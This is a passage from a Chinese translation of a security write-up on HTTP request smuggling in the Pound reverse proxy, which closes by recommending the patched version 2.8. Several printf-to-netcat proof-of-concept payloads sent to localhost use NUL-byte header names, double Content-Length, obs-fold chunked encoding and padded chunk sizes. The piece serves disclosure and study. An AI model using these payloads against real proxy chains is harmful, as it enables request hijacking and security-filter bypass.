    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
这是使用`Double Content-length Support`的具有另一个处理方法。 如果代理链中的前一个请求不支持`double Content-Length`，但可以支持NULL字符，则可以使用此方法。
    # 2 responses instead of 3 (2nd query is wipped out by pound, used as a body)
    printf 'GET / HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Content-\0dummy: foo\r\n'\
    'length: 51\r\n'\
    'Content-length: 0\r\n'\
    '\r\n'\
    'GET /tmp HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
    # 3 responses instead of 2 (2nd query is unmasked by pound)
    printf 'GET / HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Transfer-\0Mode: magic\r\n'\
    'Encoding: chunked\r\n'\
    'Content-length: 57\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    'GET /tmp/ HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
如果你复现到这里，你可以比较最后两个例子。 在第一个例子中，我们进行了一个恶意的分块传输，在最后一个例子中我们使用`ops-fold`语法。
使用wireshark来比较行为和传输到后端的一些消息语法。
    # chunk mode not applied
    printf 'GET / HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Transfer-\0Mode: magic\r\n'\
    'Encoding: chunked,zorg\r\n'\
    'Content-length: 57\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    'GET /tmp/ HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
    # chunk mode applied, and '\r\n zorg\r\n' ops-fold transmitted
    printf 'GET / HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Transfer-\0Mode: magic\r\n'\
    'Encoding: chunked\r\n'\
    ' zorg\r\n'\
    'Content-length: 57\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    '0\r\n'\
    '\r\n'\
    'GET /tmp/ HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    'GET /tests HTTP/1.1\r\n'\
    'Host:localhost\r\n'\
    'Dummy:Header\r\n'\
    '\r\n'\
    | nc -q3 127.0.0.1 8080
#### 5）传输问题
这种异常的`ops-fold`语法传输可能带来安全隐患，之后它在版本2.8中被删除。 通常，支持ops-fold的反向代理不会进行语法传输（将所有信息都体现在一行数据上）。
以下是与之类似的传输问题（遗憾的是这些漏洞没有被修复）：
    printf 'GET / HTTP/1.1\r\n'\ 'Host:localhost\r\n'\ 'Transfer-Encoding: chunked\r\n'\ 'Dummy:Header\r\n'\ '\r\n'\ '0000000000000000000000000000042\r\n'\ '\r\n'\ 'GET /tmp/ HTTP/1.1\r\n'\ 'Host:localhost\r\n'\ 'Transfer-Encoding: chunked\r\n'\ '\r\n'\ '0\r\n'\ '\r\n'\ | nc -q3 127.0.0.1 8080
这并不是无效的查询。 第一个块大小是六进制`42`，所以它是66个字节。 第二个块是块结束标记，最后两行是`0 \ r \ n \ r \ n`。 `GET
/ tmp /`查询不存在，第一个块中没有对它进行解释。
但如果使用wireshark，我们将检测到此消息按原样传输，`0000000000000000000000000000042`未重新更新为`42`或`042`。麻烦的是，对于某些后端（块大小属性截断问题），此语法有时会出现问题，比如将`0000000000000000000000000000042`读取为`00000000000000000`，并错误地将其检测为块结束标记，然后错误的发现`GET
/ tmp /`查询。
当然这里的安全问题是出现在后端，而不是Pound。 其他一些传输问题已得到修复，例如下列语法：
    GET /url?foo=[SOMETHING]HTTP/0.9 HTTP/1.1\r\n or GET /url?foo=[SOMETHING]Host:example.com, HTTP/1.1\r\n
使用`[SOMETHING] = BACKSPACE`或`CR`或`BELL`或`FORM FEED`或`TAB`。
### 安全性
错误的HTTP语法解析是一个安全隐患，主要问题是HTTP请求网络中的任何危险HTTP请求都会成为攻击源头，之前的请求会成为受害方。
遭受Request拆分的请求会错误地读取无效的内容并从中提取查询结果。在这之前并没有任何请求可以过滤此查询。
这就是为什么RFC对于消息大小的语法解析有最低的要求。
在安装过程中，Pound将成为SSL终端，通常是链中的第一个服务器端请求。
在这个位置，请求拆分攻击很难被利用。也许它可能被用来攻击客户端的转发代理，但它不能用于攻击后端。
    _____________________________              _________________________________
    |      Client Side          |              |     Server Side               |
    Browser ---> Forward proxy ------Internet---> Pound ---> Varnish ---> Nginx
                        NAIL? <================== HAMMER?
                                                  NAIL? <==== HAMMER?
其他出现在Pound前面的HTTPS负载均衡器会更具危险，因为Pound可以用来向这些代理发送一些额外的响应（WAF?）。
从攻击者的角度来看，最有效的攻击点是传输问题，其中的消息头由Pound传输到后端。
然而在后端我们经常会遇到一些问题，所以向后端发送错误的查询并不是明智之举。
这里存在两个主要的漏洞，双内容长度和不考虑分块优先级，这些问题在后端比在前端更危险。 在我看来，这减少了对这些问题的利用的影响。
然而由于代理没有进行任何拆分操作，就只是转发了这些危险的代码，从而导致了这些恶意行为的产生。
### 如何使用Pound？
首先你可以使用Pound 2.8， 或带有补丁的2.7.x。
如果用户的发行版上没有固定版本，那么我们可以尝试编译Pound 2.8。 我在jessie上编写了几个Pound的汇编，并且难度不大
(configure/make/make install)。
### 参考链接
  * Video [Defcon HTTP Smuggling](https://www.youtube.com/watch?v=dVU9i5PsMPY)
  * [Defcon support](https://media.defcon.org/DEF%20CON%2024/DEF%20CON%2024%20presentations/DEFCON-24-Regilero-Hiding-Wookiees-In-Http.pdf)
  * Video [Defcon demos](https://www.youtube.com/watch?v=lY_Mf2Fv7kI)
    本文为翻译稿件，翻译自：https://regilero.github.io/security/english/2018/07/03/security_pound_http_smuggling/